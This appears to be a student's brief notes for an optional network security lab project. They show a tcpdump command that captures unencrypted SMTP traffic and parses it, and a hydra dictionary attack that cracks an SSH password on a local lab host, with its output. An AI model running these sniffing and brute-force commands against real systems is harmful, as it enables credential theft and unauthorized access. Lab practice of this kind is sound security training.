# Attack is the best defense

Network security Optional Project

## Tasks:

(0. ARP spoofing and sniffing unencrypted traffic)
sudo tcpdump dst smtp.sendgrid.net and port 587 -Aq > output.txt
cat output.txt | tr '\n' ' ' | sed 's/\s\s/\n/g' | rev | cut -d '.' -f1 | rev | tr -s '\n'

================================================================================

(1. Dictionary attack)
($) hydra -l sylvain -P ~/Downloads/rockyou.txt -t 64 ssh://127.0.0.1:2222
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
